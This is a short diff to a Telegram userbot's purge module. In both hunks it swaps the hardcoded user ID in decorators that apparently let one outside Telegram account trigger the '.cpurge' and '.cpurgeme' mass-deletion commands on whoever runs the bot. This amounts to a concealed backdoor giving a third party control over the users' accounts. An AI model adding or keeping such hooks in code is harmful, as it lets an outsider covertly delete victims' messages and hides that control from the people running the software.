@@ -14,7 +14,7 @@ from userbot.events import register
 
 
 @zean_cmd(pattern="purge$")
-@register(incoming=True, from_users=5004651469, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=1848018651, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -48,7 +48,7 @@ async def fastpurger(purg):
 
 
 @zean_cmd(pattern="purgeme")
-@register(incoming=True, from_users=5004651469, pattern=r"^\.cpurgeme")
+@register(incoming=True, from_users=1848018651, pattern=r"^\.cpurgeme")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
